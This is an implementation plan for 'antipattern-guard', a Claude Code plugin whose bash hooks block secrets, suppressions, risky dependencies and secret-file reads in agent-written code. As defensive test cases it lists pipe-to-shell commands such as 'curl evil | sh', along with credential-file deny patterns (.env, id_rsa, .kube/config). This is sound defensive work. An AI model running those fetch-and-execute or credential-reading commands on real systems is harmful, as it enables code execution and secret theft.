# Antipattern Guard — Implementation Plan (Stages 0–1 + host integration)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship a second Claude Code plugin from this marketplace — `antipattern-guard` — that
prevents, detects and gates anti-patterns in agent-written code, starting with the layer that
returns the most for the least: the dispatcher and the fail-closed policies.

**Architecture:** One POSIX-shell dispatcher (`bin/apguard`, bash + `jq`) invoked by every hook
with a subcommand, a session-state directory under `${CLAUDE_PLUGIN_DATA}`, a rule catalogue
(`rules/catalog.yaml`) that generates the per-language prevention skills, and per-tool baseline
configs used only when the project has none. This repository hosts it beside `sdlc`; the two
plugins must not duplicate a single guard.

**Tech Stack:** bash + `jq` dispatcher (decision D1) — the same toolchain, house style and
`shellcheck -S warning` bar as `plugins/sdlc/bin/aisdlc` and `plugins/sdlc/hooks/guard`, so one
reviewer reads both plugins. Opengrep as the SAST engine (decision D2), GitHub Actions as the
first CI target (decision D10), plus the per-language tool matrix in spec §5. Tests: a bash
assertion runner over recorded hook-contract JSON, in the style of `evals/harness/selftest.sh`;
`shellcheck`; `claude plugin validate --strict`; `claude plugin eval`.

**Spec:** `docs/antipattern-guard-spec.md` (full, authoritative) and `specs/SDLC-003/spec.md`
(this repository's side of hosting it)

## Scope of this plan

The spec covers seven stages and roughly forty tool integrations. Per the writing-plans scope
rule, that is several independent subsystems and gets several plans. This document plans, in full
task detail:

- **Stage D** — the blocking decision gate (spec §0.1, §12). Nothing starts before it.
- **Stage 0** — foundation: skeleton, manifest, pinned tools, `doctor --install`, baseline-config
  validation.
- **Stage 1** — dispatcher and fail-closed policies: `session-start`, `pre-bash`, `pre-write`,
  `pre-read`, session state, hook-contract tests.
- **Stage H** — host integration in this repository (`specs/SDLC-003/spec.md`).

**Stages 2–6 are outlined at the end** with their acceptance criteria only. Each gets its own
plan, written when its predecessor is green — a plan for tool #37 written today would be fiction.

## Global Constraints

- Everything in the plugin — code, identifiers, tool messages, commits, code comments — is in
  **English**. User documentation may be Polish (spec §0.2).
- **No feature outside the spec.** Ideas go to `plugins/antipattern-guard/docs/ideas.md` (§0.4).
- Rule and parameter names in baseline configs are as of 2026-09 and **must be validated against
  the pinned tool version** (§9.3). A renamed or removed rule is fixed in the config and recorded
  in `CHANGELOG.md` — never silently dropped (§0.3).
- **Fail-open for infrastructure, fail-closed for policy** (Z6): a missing tool, a timeout or a
  parser crash reports once per session and lets the agent through; secrets, suppression bypass
  and `curl | sh` always block.
- **No network in the fast path** (Z7). Network only in the `Stop` gate and only with
  `allow_network = true`.
- Agent-facing output: ≤ 20 findings, one line each, < 4000 characters total (Z4).
- `exit 2` is the only blocking signal for policies; `exit 0` + JSON for structured decisions;
  stderr on `exit 0` is invisible to Claude (§3.2).
- Every `Stop` handler checks `stop_hook_active` and gives up after 2 iterations (Z8).
- No tool is installed from a mutable tag. Every binary is pinned by version **and sha256** in
  `tools/tools.lock.json`; a hash mismatch aborts the install (§5.1, §9.2).
- Licences: own content only. No Semgrep Registry or SonarSource rule text, no verbatim CC BY-SA
  excerpts — paraphrase and link (§10).
- Every stage ends with `claude plugin validate plugins/antipattern-guard --strict` green (§0.5).

---

## Stage D: The decision gate [ANSWERED 2026-09-16]

Spec §0.1 forbids starting Stage 1 on unconfirmed blocking decisions. All three are answered;
this plan is written against the answers.

| # | Decision | Answer | Consequence carried through this plan |
|---|---|---|---|
| D1 | Dispatcher language | **bash + `jq`** | No compiled artefact, no cross-compilation, no release matrix; `jq` and `flock` become pinned dependencies (Task 0.2 step 2); tests are bash assertions, not `go test`; Windows support is a wrapper problem deferred to Stage 6 and recorded as a known limitation |
| D2 | SAST engine | **Opengrep**, `sast_engine=semgrep\|none` kept working | Own rules stay in the syntax both engines accept; taint-mode rules are marked in the catalogue so a `semgrep` fallback degrades visibly rather than silently |
| D10 | Target CI system | **GitHub Actions** | Stage 2 implements `actionlint` + `zizmor` with `unpinned-uses: hash-pin`; the GitLab Opengrep rule set (§6.9) moves behind it, and AP-CI-006 ships in Stage 3 or later |

**Why Opengrep rather than Semgrep CE** — the reasoning to record, because it is the one answer
that was a recommendation rather than a choice:

- The rules that need **dataflow** are the ones no other tool in the matrix covers. PHP has Psalm
  taint and Go has `gosec`; Python, TypeScript and Node have nothing free that tracks
  `req.body` → sink. AP-NODE-SEC-001, AP-PY-SEC-001 and AP-TS-SEC-004 are precisely those, and
  Opengrep keeps intra-file taint in the open-source engine while Semgrep moved it behind the
  paid tier.
- The rule **format and JSON/SARIF output are identical**, so `sast_engine` stays a one-word
  switch rather than a rewrite — which is the only reason it is safe to bet on a young fork.
- **Neither engine changes the licence problem**: Semgrep Registry rules cannot be shipped either
  way (§10), so the plugin writes its own rules regardless. Opengrep costs nothing here.
- The risk is maintenance, not capability: the fork is young and small. Mitigations, both cheap:
  pin it by sha256 like every other binary, and keep every own rule inside the syntax Semgrep CE
  also parses, verified by running `scripts/validate-configs` with `sast_engine=semgrep`.

- [ ] **Step 1: Record the answers**

Write `plugins/antipattern-guard/docs/decisions.md`: the table above with the date, plus the
non-blocking decisions taken at the spec's recommendation — D3 `balanced`, D4 Stop blocks on
blockers only with at most 2 iterations, D5 Trivy and KICS off, D6 ESLint + typescript-eslint,
D7 project's type checker with Pyright as fallback, D8 `allow_network=false`, D9 no LLM review
overlap with `security-guidance`. D11 (default SQL dialect) is still open and blocks nothing
before Stage 2: until answered, `postgres` is the default and `squawk` runs only on PostgreSQL
migrations.

- [ ] **Step 2: Commit the record**

```bash
git add plugins/antipattern-guard/docs/decisions.md
git commit -m "docs(apguard): record the answered decisions (bash+jq, opengrep, github actions)"
```

---

## Stage 0: Foundation

### Task 0.1: Skeleton, manifest, licences

**Files:**
- Create: `plugins/antipattern-guard/.claude-plugin/plugin.json`
- Create: `plugins/antipattern-guard/hooks/hooks.json` (empty `hooks` object for now)
- Create: `plugins/antipattern-guard/LICENSE` (MIT), `THIRD_PARTY_NOTICES.md`, `CHANGELOG.md`
- Create: `plugins/antipattern-guard/docs/ideas.md`, `docs/decisions.md`
- Create: the directory tree of spec §4.1 with a `.gitkeep` in each empty directory

**Interfaces:**
- Produces: the plugin name `antipattern-guard` and its `userConfig` keys — read by every later
  task as `CLAUDE_PLUGIN_OPTION_ENFORCEMENT_MODE`, `…_STOP_GATE`, `…_SAST_ENGINE`,
  `…_ALLOW_NETWORK`, `…_TOOL_SOURCE` (§3.1).

- [ ] **Step 1: Write the manifest**

Copy spec §4.2 verbatim into `plugins/antipattern-guard/.claude-plugin/plugin.json`. Do not add
keys: `settings.json` for a plugin supports only `agent` and `subagentStatusLine`, and a plugin
**cannot** set `permissions` (§3.1) — that is why §7.4 ships a snippet instead.

- [ ] **Step 2: Write the empty hook manifest**

```json
{
  "description": "Antipattern Guard: prevention, detection and gating",
  "hooks": {}
}
```

Hooks are wired in Stage 1, one subcommand at a time. A manifest pointing at an unimplemented
subcommand fails open, which hides the defect — so it stays empty until the handler exists.

- [ ] **Step 3: Write the licence files**

`LICENSE`: MIT, own content. `THIRD_PARTY_NOTICES.md` starts with the three entries the plugin
already needs (§10): the MITRE CWE copyright notice reproduced per the CWE Terms of Use; OWASP
Cheat Sheet Series and nodebestpractices as CC BY-SA 4.0 sources that are **paraphrased and
linked, never quoted**; and the run-only tools whose licences never enter this repository
(golangci-lint, hadolint GPL; Opengrep LGPL; njsscan rules LGPL).

- [ ] **Step 4: Verify and commit**

```bash
jq . plugins/antipattern-guard/.claude-plugin/plugin.json
jq . plugins/antipattern-guard/hooks/hooks.json
claude plugin validate plugins/antipattern-guard --strict
git add plugins/antipattern-guard
git commit -m "feat(apguard): plugin skeleton, manifest and licence notices"
```

### Task 0.2: The pinned tool lockfile and `doctor --install`

**Files:**
- Create: `plugins/antipattern-guard/tools/tools.lock.json`
- Create: `plugins/antipattern-guard/tools/python/requirements.lock` (hash-pinned)
- Create: `plugins/antipattern-guard/tools/node/package.json` + `package-lock.json`
- Create: `plugins/antipattern-guard/bin/apguard` — dispatcher entry point, `doctor` subcommand
  only for now
- Create: `plugins/antipattern-guard/lib/tools.sh` — resolution and install functions
- Create: `plugins/antipattern-guard/tests/run-tests` — the bash assertion runner
- Test: `plugins/antipattern-guard/tests/tools_test.sh`

**Interfaces:**
- Consumes: `CLAUDE_PLUGIN_OPTION_TOOL_SOURCE`.
- Produces: `apguard doctor`, `apguard doctor --install`, and the resolution order every later
  tool call uses — `resolve_tool <name>` prints an absolute path or nothing: project binary →
  `${CLAUDE_PLUGIN_DATA}/tools/<name>/current/` → `PATH` **only if `--version` matches the
  lockfile** (§9.1).

- [ ] **Step 1: Write the test runner and the failing install test**

`tests/run-tests` follows `evals/harness/selftest.sh` exactly — `ok()`/`bad()` counters, a
`PASS`/`FAIL` summary, non-zero exit on any failure — because this repository already reviews and
runs that shape, and a second test idiom in one repo is a second thing to learn.

`tests/tools_test.sh` asserts on the filesystem, not on log text: a correct sha256 installs the
asset and points `current` at the version directory; a wrong sha256 leaves **no** version
directory, removes the download, and exits non-zero. Serve the fake asset from a `file://` URL so
the test needs no network.

```bash
plugins/antipattern-guard/tests/run-tests
```

Expected: FAIL — `lib/tools.sh` does not exist.

- [ ] **Step 2: Write the lockfile, including the dispatcher's own dependencies**

Use spec §9.2's schema verbatim, with one addition D1 forces: **`jq` and `flock` are now part of
the product, not assumptions.** Pin `jq` by version and sha256 per platform like any other
binary. Rationale to put in the file's comment: Z6 makes policy enforcement fail-closed, and a
missing `jq` would silently turn every policy into a no-op — the one failure mode this plugin
cannot have. `flock` is present on Linux and absent on macOS: `lib/state.sh` must therefore use
`mkdir`-based locking (atomic on every POSIX filesystem) rather than depending on it, and the
lockfile records that decision instead of pinning a binary that does not exist everywhere.

Everything else from §9.2 still holds: nothing pinned within 7 days of publication; a bump is a
PR that updates the hashes and keeps the fixtures green; Renovate may open it and may not merge.

- [ ] **Step 3: Implement resolution and install**

In `lib/tools.sh`: `resolve_tool`, `tool_version_matches`, `install_tool`. Download → verify
sha256 (`sha256sum` or `shasum -a 256`, whichever exists) → extract into the version directory →
atomic symlink swap of `current`. Python via `uv pip install --require-hashes`; the ESLint stack
via `npm ci --ignore-scripts` on a copy of `tools/node/package*.json` in `${CLAUDE_PLUGIN_DATA}`,
reinstalled only when that copy differs from the one in `${CLAUDE_PLUGIN_ROOT}` (§9.2). Never
write under `${CLAUDE_PLUGIN_ROOT}` — it is replaced on update (§3.1).

- [ ] **Step 4: Implement `doctor`**

Report, per tool: resolved source (project / plugin / `PATH`), version, whether it matches the
lockfile, and the config file that would be used. Missing tools print the exact install command.
`doctor` installs nothing unless `--install` is passed.

- [ ] **Step 5: Verify and commit**

```bash
cd plugins/antipattern-guard && tests/run-tests && shellcheck -S warning bin/apguard lib/*.sh tests/*.sh tests/run-tests
bin/apguard doctor
git add plugins/antipattern-guard && git commit -m "feat(apguard): pinned tool lockfile, verified installer, doctor"
```

### Task 0.3: Baseline configs, validated against the pinned versions

**Files:**
- Create: every file in `plugins/antipattern-guard/configs/baseline/` from spec §6 — `phpstan.neon`,
  `psalm.xml`, `phpmd.xml`, `.golangci.yml`, `ruff.toml`, `pyrightconfig.json`,
  `eslint.config.mjs`, `eslint.security-overlay.mjs`, `.sqlfluff`, `.squawk.toml`, `.tflint.hcl`,
  `.checkov.yaml`, `.kube-linter.yaml`, `.hadolint.yaml`, `zizmor.yml`, `.gitleaks.toml`
- Create: `plugins/antipattern-guard/tests/fixtures/<lang>/good/…` — the minimum each validation
  command needs
- Create: `plugins/antipattern-guard/scripts/validate-configs` — runs the §9.3 table

**Interfaces:**
- Produces: the config files the dispatcher passes with `-c`/`--config` when the project has none.
  Configs are **never copied into a consumer repo** (§6 step 2).

- [ ] **Step 1: Copy the configs from the spec**

Spec §6 gives each file's content verbatim. Copy them exactly, including the comments that explain
why a rule is excluded — a future reader deleting `fieldalignment` from the `govet` disable list
needs to know it was excluded for noise, not by accident.

- [ ] **Step 2: Write the validation script**

One command per row of the §9.3 table, each exiting non-zero on an unknown rule or an invalid
schema. Plus the consistency check: every rule id named in `rules/mapping/*.yaml` must exist in the
tool, enumerated with `ruff rule --all --output-format json`, `golangci-lint linters`,
`kube-linter checks list`.

- [ ] **Step 3: Run it and fix what has drifted**

```bash
plugins/antipattern-guard/scripts/validate-configs
```

Every rule name that no longer exists is corrected in the config **and recorded in
`CHANGELOG.md`** (§0.3). A rule that was removed upstream and has no replacement is recorded as a
detector gap against its AP id — never silently deleted.

- [ ] **Step 4: Commit**

```bash
git add plugins/antipattern-guard && git commit -m "feat(apguard): baseline configs validated against pinned tool versions"
```

**Stage 0 acceptance (§11.3):** `claude plugin validate --strict` green; `doctor` resolves every
tool on linux-amd64, linux-arm64 and darwin-arm64; `validate-configs` green with every drift
recorded in `CHANGELOG.md`.

---

## Stage 1: Dispatcher and policies

### Task 1.1: Hook plumbing, session state, and the finding type

**Files:**
- Create: `plugins/antipattern-guard/lib/hook.sh` — stdin decode, response encode, exit codes
- Create: `plugins/antipattern-guard/lib/state.sh` — session directory, `mkdir` locking, pruning
- Create: `plugins/antipattern-guard/lib/finding.sh` — the normalised finding and its fingerprint
- Modify: `plugins/antipattern-guard/bin/apguard` — subcommand dispatch, in the shape of
  `plugins/sdlc/bin/aisdlc:737-749`
- Test: `plugins/antipattern-guard/tests/hook_test.sh`, `tests/state_test.sh`

**Interfaces:**
- Produces:
  - `hook_input` — reads stdin once into a variable (a hook gets one shot at stdin, and
    `plugins/sdlc/bin/aisdlc:318-320` exists because something downstream consumed it), then
    `hook_field <jq-path>` for `session_id`, `cwd`, `hook_event_name`, `tool_name`, `tool_input`,
    `tool_use_id`, `agent_id`, `agent_type`; the file path is `.tool_input.file_path` (§3.2).
  - `hook_deny <reason>`, `hook_ask <reason>`, `hook_allow`, `hook_context <text>`,
    `hook_message <text>` — each printing the `hookSpecificOutput` JSON with `jq -n --arg`, never
    by string-concatenating JSON, because a reason containing a quote would otherwise produce
    invalid JSON and a silently ignored decision. `additionalContext` is written as **statements
    of fact, never as system-style orders** (§3.2).
  - State at `${CLAUDE_PLUGIN_DATA}/sessions/<session_id>[/<agent_id>]/{profile,touched,findings}.json`
    plus `stop-iterations` (§4.5).
  - `finding_add` — spec §4.6 verbatim, fingerprint
    `printf '%s|%s|%s|%s' "$tool" "$rule" "$file" "$snippet" | sha256sum`.

- [ ] **Step 1: Write the failing decode/encode tests**

Record four payloads under `tests/hook-contract/`: a `PreToolUse(Bash)`, a `Write`, an `Edit`, and
a `Stop` carrying `stop_hook_active: true`. Assert the extracted fields and the **exact** JSON
each helper emits, compared with `jq -S .` so key order is not the thing under test. Include the
case that matters in shell: a reason containing `"` and a `$` — the encoder must survive both.

```bash
plugins/antipattern-guard/tests/run-tests
```

Expected: FAIL — `lib/hook.sh` does not exist.

- [ ] **Step 2: Implement decode, encode and the exit-code rules**

`exit 0` + JSON for structured decisions; `exit 2` for blocking with the reason on stderr; any
other status is non-blocking and therefore **never used for a policy** (§3.2). Set
`set -uo pipefail` and not `-e`: a policy script that dies on an unrelated non-zero grep is a
policy that fails open, which Z6 forbids.

- [ ] **Step 3: Implement state with locking and pruning**

Locking is `mkdir "$dir/.lock"` in a bounded retry loop with a stale-lock age check — atomic on
every POSIX filesystem, unlike `flock`, which macOS does not ship. Sessions older than 7 days are
removed at `session-start` (§4.5). The test runs 8 concurrent appenders in background subshells
and asserts every finding survived.

- [ ] **Step 4: Verify and commit**

```bash
cd plugins/antipattern-guard && tests/run-tests && \
  shellcheck -S warning bin/apguard lib/*.sh tests/run-tests tests/*.sh
git add plugins/antipattern-guard && git commit -m "feat(apguard): hook I/O contract, session state, finding record"
```

### Task 1.2: `session-start` — stack detection and the always-on agent rules

**Files:**
- Create: `plugins/antipattern-guard/lib/detect.sh` — stack detection per spec §6.1–§6.9
- Modify: `plugins/antipattern-guard/bin/apguard` — the `session-start` subcommand
- Modify: `hooks/hooks.json` — the `SessionStart` binding from §4.3
- Test: `tests/hook-contract/session-start-*.json`, `tests/detect_test.sh` with fixture repos
  under `tests/fixtures/repos/<name>/`

**Interfaces:**
- Produces: `profile.json` (detected stacks, resolved tools, config sources) read by every later
  subcommand; stdout context < 500 characters (§4.4) containing the AP-AGENT-* digest — ≤ 15 lines
  and < 1500 characters (§8.8).

- [ ] **Step 1: Write the detection tests**

Fixture repos, each a handful of empty marker files: Laravel (`composer.json` + `artisan`),
Symfony, Go module, uv-managed Python, Vite React, Express backend, Helm chart, Terraform module.
Assert the detected stack set and the chosen config per stack — including the negative case that
Z1 exists for: a repo carrying `phpstan.neon` resolves the **project** config, not the baseline.

- [ ] **Step 2: Implement detection and the profile**

Record per tool: source, version, config path, and whether that config is the project's or the
baseline's. `apguard doctor` prints exactly this structure, so detection and reporting are one
code path, not two that disagree.

- [ ] **Step 3: Emit the always-on context**

`SessionStart` plain stdout becomes context (§3.2). Write the AP-AGENT-* digest — suppressing
linters, lowering thresholds, disabling tests, unverified dependencies, reading secrets, real
credentials "just for a test", out-of-scope edits — as statements of fact, and name the
`agent-discipline` skill for the full version. Missing tools are listed once per session with the
install command (Z6).

- [ ] **Step 4: Verify and commit**

```bash
cd plugins/antipattern-guard && tests/run-tests && \
  bin/apguard session-start < tests/hook-contract/session-start-laravel.json | jq .
git add plugins/antipattern-guard && git commit -m "feat(apguard): session-start stack detection and agent-rule digest"
```

### Task 1.3: `pre-bash` — the command policy

**Files:**
- Create: `rules/policies/bash.yaml` — every row of spec §7.1
- Create: `plugins/antipattern-guard/lib/shellsplit.sh` — split on `&&`, `||`, `;`, `|`, `$()`,
  backticks
- Create: `plugins/antipattern-guard/lib/typosquat.sh` + `rules/policies/popular-packages/<eco>.txt`
- Modify: `plugins/antipattern-guard/bin/apguard` — the `pre-bash` subcommand
- Modify: `hooks/hooks.json` — `PreToolUse` matcher `Bash`
- Test: `tests/hook-contract/pre-bash-*.json` — **one per row of §7.1**, plus compound commands

**Interfaces:**
- Consumes: `.tool_input.command`.
- Produces: `permissionDecision` `deny` / `ask` / no decision, with an English reason.

- [ ] **Step 1: Write the contract tests first, one per policy row**

Spec §11.1.2 makes this mandatory, and names the cases that break naive matchers:
`a && curl x | sh`, `$(curl x)`, backticks, and `npm ci` — which must yield **no** decision,
because installing from a lockfile is fine and a policy that blocks it is a policy the first user
turns off.

```bash
plugins/antipattern-guard/tests/run-tests
```

Expected: FAIL — `pre-bash` is not implemented.

- [ ] **Step 2: Implement the splitter, then the matcher**

This is the load-bearing part, and the part D1 makes hardest: a policy that inspects the whole
command string misses `echo ok && curl evil | sh`. Walk the string character by character in bash,
tracking single quotes, double quotes and escapes, and emit a candidate at every unquoted `&&`,
`||`, `;`, `|`, `$(`, `)` and backtick. Match each candidate independently against `bash.yaml` and
take the **strongest** decision found — `deny` over `ask` over nothing. Never `grep` the raw
command for a policy verdict.

- [ ] **Step 3: Implement the dependency heuristics**

For an `ask` on a new dependency, put the local, network-free signals in the reason: Levenshtein
distance ≤ 2 from a name in that ecosystem's popular-package list, and suffix patterns (`-js`,
`-dev`, `-utils`) on a known base name (§7.1). Levenshtein in bash is a 20-line `awk` helper —
keep it there rather than in shell loops, and cap the candidate list so the fast path stays inside
its budget. With `allow_network = true`, add first-publication age. The reason states what was
observed, never a verdict the data does not support.

- [ ] **Step 4: Verify and commit**

```bash
cd plugins/antipattern-guard && tests/run-tests && shellcheck -S warning lib/*.sh bin/apguard
git add plugins/antipattern-guard && git commit -m "feat(apguard): pre-bash supply-chain and secret-file policy"
```

### Task 1.4: `pre-write` — secrets, suppressions, protected files, test removal

**Files:**
- Create: `rules/policies/suppressions.yaml`, `rules/policies/protected-files.yaml`
- Create: `plugins/antipattern-guard/lib/secrets.sh` — Betterleaks/Gitleaks over stdin
- Modify: `plugins/antipattern-guard/bin/apguard` — the `pre-write` subcommand
- Modify: `hooks/hooks.json` — `PreToolUse` matcher `Write|Edit|MultiEdit|NotebookEdit`
- Test: `tests/hook-contract/pre-write-*.json`

**Interfaces:**
- Consumes: `tool_input.content` (Write) or `tool_input.new_string` / `old_string` (Edit).
- Produces: `deny` for secrets and unjustified suppressions; `ask` for protected files, for
  suppressing a `blocker` rule even with a reason, and for disabling tests; an
  `additionalContext` list of that language's blockers on the **first** edit of a language in the
  session, ≤ 1500 characters, never repeated (§8.8).

- [ ] **Step 1: Write the contract tests first**

From §11.1.2: a secret in `content`; a secret in `new_string`; a suppression comment without a
reason (`//nolint`) and with one (`//nolint:gosec // reason: …`); an edit to
`phpstan-baseline.neon`; an added `it.skip(`; and the first-edit-of-a-language context appearing
exactly once.

- [ ] **Step 2: Implement the secret scan**

Pipe the new content to the scanner over stdin with `--redact` (§6.10). On a hit: `deny`, and the
reason names the **secret type and location, never the value**, plus the remediation — environment
variable or secret manager.

- [ ] **Step 3: Implement added-suppression detection**

Compare against what is on disk (Write) or `old_string` (Edit) and act only on **added**
occurrences — a file that already contains `# noqa` must stay editable. Per language, the reason
pattern from §7.2B is required; a suppression carrying a real reason for a `warn`/`error` rule
passes and is recorded for the Stop report as `info`.

- [ ] **Step 4: Implement protected files and test removal**

Tool configs, baselines, and CI files — the last only when the diff removes a lint/test/security
step; `pyproject.toml` only when the diff touches a tool section; `tsconfig*.json` only when it
weakens `strict` (§7.2C). Decision `ask` with the reason "lowering quality gates must be reviewed
by a human". Test removal per §7.2D.

- [ ] **Step 5: Verify and commit**

```bash
cd plugins/antipattern-guard && tests/run-tests && shellcheck -S warning lib/*.sh bin/apguard
git add plugins/antipattern-guard && git commit -m "feat(apguard): pre-write secret, suppression and quality-gate policy"
```

### Task 1.5: `pre-read` and the recommended project settings

**Files:**
- Modify: `plugins/antipattern-guard/bin/apguard` — the `pre-read` subcommand
- Create: `plugins/antipattern-guard/docs/recommended-project-settings.json` (spec §7.4 verbatim)
- Modify: `hooks/hooks.json` — `PreToolUse` matcher `Read`
- Test: `tests/hook-contract/pre-read-*.json`

- [ ] **Step 1: Write the tests**

`deny` for `.env`, `.env.production`, `*.pem`, `id_rsa`, `**/credentials`, `.kube/config`,
`secrets/**`; **allow** `.env.example`, `.env.dist`, `.env.template`; `ask` for a `*.tfvars` whose
name contains `secret` or `prod` (§7.3).

- [ ] **Step 2: Implement, then ship the settings snippet**

A plugin cannot set `permissions` (§3.1), so `docs/recommended-project-settings.json` is the hard
layer beneath the hook. Say that plainly in the file's companion documentation: the hook is
defence in depth, the permission rules are the floor.

- [ ] **Step 3: Verify and commit**

```bash
cd plugins/antipattern-guard && tests/run-tests && \
  shellcheck -S warning bin/apguard lib/*.sh tests/run-tests tests/*.sh && \
  claude plugin validate plugins/antipattern-guard --strict
git add plugins/antipattern-guard && git commit -m "feat(apguard): pre-read secret-file policy and project settings snippet"
```

**Stage 1 acceptance (§11.3):** every policy hook-contract case passes; the evals
`agent-suppression-bait` and `dependency-bait` score ≥ 0.8 with the plugin and visibly worse
without it (`claude plugin eval --ablation with-without`); logs land in
`${CLAUDE_PLUGIN_DATA}/logs/`.

---

## Stage H: Host integration in this repository

Implements `specs/SDLC-003/spec.md`. Do this before Stage 1 ships, because CI must be able to see
the second plugin.

### Task H.1: Marketplace entry and per-plugin versioning

**Files:**
- Modify: `.claude-plugin/marketplace.json` — a second entry in `plugins[]`
- Modify: `Makefile` — a `bump-apguard` target beside `bump-patch|minor|major`
- Modify: `.github/workflows/validate.yml` — version consistency for both plugins

- [ ] **Step 1: Add the marketplace entry**

```json
    {
      "name": "antipattern-guard",
      "source": "./plugins/antipattern-guard",
      "description": "Prevents, detects and gates security, performance and maintainability anti-patterns in agent-written code: per-language prevention skills, deterministic checks after each edit, and a Stop gate that blocks on unresolved blockers",
      "version": "0.1.0",
      "strict": true
    }
```

`_bump` already selects `.plugins[] | select(.name == "sdlc")`, so `make bump-minor` cannot touch
it — verify that, do not assume it.

- [ ] **Step 2: Add `bump-apguard`**

A sibling of `_bump` that rewrites `plugins/antipattern-guard/.claude-plugin/plugin.json` and the
matching marketplace entry, and leaves `.metadata.version` alone: the marketplace version tracks
the repository, not either plugin.

- [ ] **Step 3: Extend the CI version check**

Loop over both plugin names instead of hardcoding `sdlc`, failing when a `plugin.json` version and
its marketplace entry disagree.

- [ ] **Step 4: Verify and commit**

```bash
jq . .claude-plugin/marketplace.json && make validate
make bump-minor && git diff --stat        # only the sdlc version moved
git checkout .claude-plugin/marketplace.json plugins/sdlc/.claude-plugin/plugin.json
git add .claude-plugin/marketplace.json Makefile .github/workflows/validate.yml
git commit -m "build: host a second plugin with independent versioning (SDLC-003)"
```

### Task H.2: `validate-apguard`, without disturbing the `sdlc` checks

**Files:**
- Modify: `Makefile` — new target, added to `.PHONY`; `validate` gains a soft dependency
- Modify: `.github/workflows/validate.yml`

- [ ] **Step 1: Add the target**

```make
validate-apguard: ## Validate the antipattern-guard plugin, if present
	@test -d plugins/antipattern-guard || { echo "  – antipattern-guard not present, skipped"; exit 0; }
	@jq . plugins/antipattern-guard/.claude-plugin/plugin.json > /dev/null && echo "  ✓ apguard plugin.json"
	@jq . plugins/antipattern-guard/hooks/hooks.json > /dev/null && echo "  ✓ apguard hooks.json"
	@jq . plugins/antipattern-guard/tools/tools.lock.json > /dev/null && echo "  ✓ apguard tools.lock.json"
	@test "$$(jq -r '.name' plugins/antipattern-guard/.claude-plugin/plugin.json)" = "antipattern-guard" \
		|| (echo "  ✗ apguard plugin name mismatch" && exit 1)
	@for s in plugins/antipattern-guard/bin/apguard plugins/antipattern-guard/lib/*.sh \
	          plugins/antipattern-guard/tests/run-tests; do \
		bash -n "$$s" || (echo "  ✗ $$s SYNTAX ERROR" && exit 1); \
	done
	@echo "  ✓ apguard shell syntax"
	@command -v shellcheck > /dev/null 2>&1 && \
		(shellcheck -S warning plugins/antipattern-guard/bin/apguard \
		            plugins/antipattern-guard/lib/*.sh \
		            plugins/antipattern-guard/tests/run-tests && echo "  ✓ apguard shellcheck clean") || \
		echo "  – shellcheck not installed, skipped"
	@plugins/antipattern-guard/tests/run-tests
	@command -v claude > /dev/null 2>&1 && claude plugin validate plugins/antipattern-guard --strict \
		|| echo "  – claude CLI not installed, plugin validate skipped"
```

D1 is what makes this target carry weight: with a shell dispatcher, `bash -n`, `shellcheck` and
the plugin's own assertion runner **are** its type system. The list of scripts is a glob, not an
enumeration, so a new `lib/*.sh` cannot be added without being linted.

The absence of the directory is **not** an error: this repository must stay installable alone
(`docs/overlay-contract.md`). Keep the existing `sdlc` checks untouched — they are green and
tested.

- [ ] **Step 2: Verify both ways**

```bash
make validate && make validate-apguard          # with the plugin present
mv plugins/antipattern-guard /tmp/ && make validate && make validate-apguard && mv /tmp/antipattern-guard plugins/
```

Expected: green in both states, with the skip message in the second.

- [ ] **Step 3: Commit**

```bash
git add Makefile .github/workflows/validate.yml
git commit -m "build: validate the second plugin without coupling it to the sdlc checks (SDLC-003)"
```

### Task H.3: One owner per guard, and what `ask` means with no human

**Files:**
- Modify: `plugins/antipattern-guard/rules/policies/bash.yaml` — drop the duplicated rows
- Modify: `plugins/antipattern-guard/docs/` — state the boundary
- Modify: `plugins/sdlc/hooks/guard` — a comment naming the boundary, no behaviour change
- Modify: `plugins/sdlc/bin/aisdlc` — export the headless marker in `invoke_claude`
- Test: `evals/harness/selftest.sh`

**Interfaces:**
- Produces: the ownership split, and the environment variable `AISDLC_HEADLESS=1`, exported by
  `invoke_claude` and read by `apguard` to resolve `ask` without a human.

- [ ] **Step 1: Split ownership, and delete the duplicate**

| Act | Owner | Why |
|---|---|---|
| Force push, `--no-verify`, `rm -rf` outside the tree | `sdlc` guard (`hooks/guard:33-74`) | Already shipped, already tested, and the queue depends on it |
| Deleting or skipping a test at turn end | `sdlc` guard `stop` (`:84-148`) | Tied to the dense-testing non-negotiables and the spec's UC traceability |
| Secrets, suppressions, protected configs, supply chain, lint findings | `antipattern-guard` | Its whole subject; no overlap with the above |
| Framework-specific rules **inside** a file (Laravel `env()` outside config, `$request->all()` mass assignment, Django raw SQL, Express body limit) | `antipattern-guard` | Its detection already resolves the framework (§6.1) and picks the extensions and own Opengrep rules per framework |
| Dependency **direction between** components (transport must not be imported by domain) | `sdlc`, as an architecture test | `specs/SDLC-004/spec.md`: the boundary is declared in `design.md` and enforced by the project's own arch-test tool inside `make verify`, so it fails in CI and not only in the agent's session |

Remove from `bash.yaml` the rows that duplicate the `sdlc` guard: force push, `git commit
--no-verify`, and the test-file `rm`. Antipattern Guard keeps the lockfile-deletion and
secret-file rows, which the `sdlc` guard does not cover. Two plugins blocking one act give the
agent two reasons for one failure — it will argue with the weaker one.

- [ ] **Step 2: Decide `ask` in a headless run — write the failing assertion first**

In `evals/harness/selftest.sh`, append a case asserting that the runner exports the marker:

```bash
printf '\nthe queue tells hooks there is nobody to ask\n'
grep -q 'AISDLC_HEADLESS=1' "$REPO_ROOT/plugins/sdlc/bin/aisdlc" \
    && ok "invoke_claude exports AISDLC_HEADLESS" \
    || bad "headless marker" "hooks cannot tell a queued phase from an interactive session"
```

Run `make selftest` — expect FAIL.

- [ ] **Step 3: Export the marker**

In `invoke_claude` (`plugins/sdlc/bin/aisdlc:302-319`), export `AISDLC_HEADLESS=1` for the
`claude` invocation only — the phase already runs in a subshell, so the variable does not leak
into the runner's own environment.

- [ ] **Step 4: Define the headless rule in the plugin**

With `AISDLC_HEADLESS=1`, `apguard` resolves every `ask` as `deny` **with the same reason plus
"no human in this session"**, and never as a silent allow. Rationale, stated in the docs: the
queue runs with `--permission-mode bypassPermissions` (`bin/aisdlc:302-319`), so an `ask` has
nobody to answer it; denying with a reason produces a clean `BLOCKED.md`, while allowing would let
exactly the supply-chain acts this plugin exists to stop through unattended.

- [ ] **Step 5: Verify and commit**

```bash
